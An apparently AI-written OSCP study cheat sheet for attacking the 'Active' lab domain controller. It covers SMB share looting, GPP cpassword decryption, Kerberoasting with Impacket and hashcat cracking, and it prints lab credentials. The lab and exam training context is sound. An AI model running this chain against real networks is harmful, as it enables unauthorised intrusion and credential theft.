


Here is a meticulously organized, OSCP-style command cheat sheet based on the workflow we just covered for the **Active** machine. 

This is structured sequentially, exactly how you would approach a Windows Active Directory box in an exam environment: from initial scanning to domain privilege escalation.

---

### Phase 1: Port Scanning & Initial Recon
*Always start by mapping the open ports and identifying the services. Seeing ports like 88 (Kerberos), 389 (LDAP), and 445 (SMB) immediately flags the target as a Domain Controller.*

```bash
# 1. Fast all-ports TCP scan to find what is open
nmap -p- --min-rate=10000 -oA allports <IP>

# 2. Targeted script and version scan on the discovered ports
nmap -p <Found_Ports> -sC -sV -oA targeted <IP>

# lot of nmap results
nmap -p- --min-rate=10000 -oA allports <IP>
ports=$(grep -oP '\d+/open' allports.gnmap | cut -d/ -f1 | paste -sd, -)
echo $ports
nmap -sC -sV -p$ports -oA targeted <IP>
```

---

### Phase 2: SMB Enumeration (Unauthenticated / Anonymous)
*Before throwing exploits, check what the server allows you to see without valid credentials.*

```bash
# 1. List shares and permissions clearly using smbmap (Anonymous)
smbmap -H <IP>

# 2. List shares using smbclient (Null Session / Blank Credentials)
smbclient -L //<IP>/ -N
smbclient -L //<IP>/ -U "%"

# 3. Deep enum for SIDs, users, policies, and shares (often blocked on modern Windows, but mandatory to try)
enum4linux -a <IP>
```

---

### Phase 3: SMB Share Interaction & Hunting for Loot
*Once you identify a readable share (like `Replication` or `SYSVOL`), connect to it and hunt systematically for configuration files, scripts, and XMLs.*

```bash
# Connect to a specific share anonymously
smbclient //<IP>/Replication -N
# OR explicitly with blank username/password
smbclient //<IP>/Replication -U "%"
```

**Inside the `smbclient` interactive prompt:**
```bash
# Basic Navigation
ls                   # List directory contents
cd <Directory>       # Move into a directory (e.g., cd active.htb\Policies)
cd ..                # Move up a directory

# Fast file triage (Read a file without downloading it to your local disk)
more Groups.xml

# Download a single file
get Groups.xml

# Advanced: Targeted Recursive Downloading (e.g., pulling all XMLs, and check cpassword)
lcd /home/kali/loot  # Change LOCAL directory where files will be saved
mask "*.xml"         # Only look for .xml files
recurse ON           # Turn on recursive searching
prompt OFF           # Don't ask for confirmation for every single file
mget *               # Download everything matching the mask
mask "*"             # reset mask at the end.

# With the folder context
smbclient //10.10.10.100/Replication -N -D 'active.htb\Policies' -Tc /home/kali/loot/policies.tar '*'
tar -xf /home/kali/loot/policies.tar -C /home/kali/loot/policies_tree
grep -Rni 'cpassword' /home/kali/loot/policies_tree

```

```
# Search Locally further
grep -Rni 'cpassword' /home/kali/loot/policies_xml
find /home/kali/loot/policies_xml -type f | grep -Ei 'Groups\.xml|Services\.xml|ScheduledTasks\.xml|Drives\.xml'
```

On an AD target, if you can read a policy-related share, your default search pattern is:

```
<domain>\Policies\{GUID}\MACHINE\Preferences\
<domain>\Policies\{GUID}\USER\Preferences\
```

Then inspect subfolders such as:

```
Groups
Services
ScheduledTasks
Drives
DataSources
```

---

### Phase 4: Credential Extraction (Group Policy Preferences)
*If you find a `Groups.xml`, `Services.xml`, `ScheduledTasks.xml`, or `Drives.xml` file, look for the `cpassword` string. This is encrypted with a known Microsoft key.*

```bash
# Decrypt the AES-256 cpassword string found in the XML
gpp-decrypt '<cpassword_string_here>'

# Example:
gpp-decrypt 'edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ'

# If there is no gpp-decrypt

cd /opt
sudo git clone https://github.com/t0thkr1s/gpp-decrypt.git
cd gpp-decrypt
python3 gpp-decrypt.py -f /home/yeachan/loot/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml
```

---

### Phase 5: Authenticated SMB Enumeration
*A recovered password changes your authorization context. Immediately check what new access you have across the network.*

```bash
# Check share permissions again, this time with credentials
smbmap -H <IP> -d <Domain> -u <Username> -p '<Password>'

# Example from Active:
smbmap -H 10.129.207.36 -d active.htb -u SVC_TGS -p 'GPPstillStandingStrong2k18'

# Connect to a newly accessible share (like Users) to grab flags or user files
smbclient //<IP>/Users -U '<Domain>\<Username>%<Password>'

# Example:
smbclient //10.129.207.36/Users -U 'active.htb\SVC_TGS%GPPstillStandingStrong2k18'
```

---

### Phase 6: Active Directory PrivEsc (Kerberoasting)
*With a valid low-privileged domain account, check if any Domain Admin or high-value accounts have Service Principal Names (SPNs) attached to them. If they do, you can request their Kerberos tickets and crack them offline.*

```bash
# Typical Impacket command (Check whether we can get TGS or not)
GetUserSPNs.py active.htb/SVC_TGS:<password> -dc-ip 10.10.10.100

# Use Impacket to find vulnerable accounts and extract the TGS hash in one command
# Syntax: GetUserSPNs.py <domain>/<user>:<password> -dc-ip <DC_IP> -request

GetUserSPNs.py active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip 10.129.207.36 -request
```
*Note: Save the resulting hash (everything from `$krb5tgs$` to the end) into a text file named `hash.txt`.*

---

### Phase 7: Offline Password Cracking
*Take the Kerberos TGS ticket you requested and crack it using a wordlist on your local Kali machine.*

```bash
# Using Hashcat (Module 13100 is for Kerberos 5 TGS-REP etype 23)
hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt

# Using John The Ripper
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

---

### 💡 OSCP Exam Tips for this Workflow:
1. **Always use `-oA` with Nmap.** If your terminal crashes, you don't want to wait 15 minutes for a rescan.
2. **Keep an SMB loot folder.** Use `lcd` in `smbclient` to isolate downloaded files for each machine so you don't clutter your main Kali directories.
3. **Impacket Tool Syntax:** Impacket tools (`GetUserSPNs.py`, `psexec.py`, `secretsdump.py`, etc.) almost always use the format `domain/username:password@IP` or require the `-dc-ip` flag. Memorize this syntax.
4. **Assume nothing.** Just because you got the `SVC_TGS` password doesn't mean it's the account you need to crack. *Follow the SPNs.*
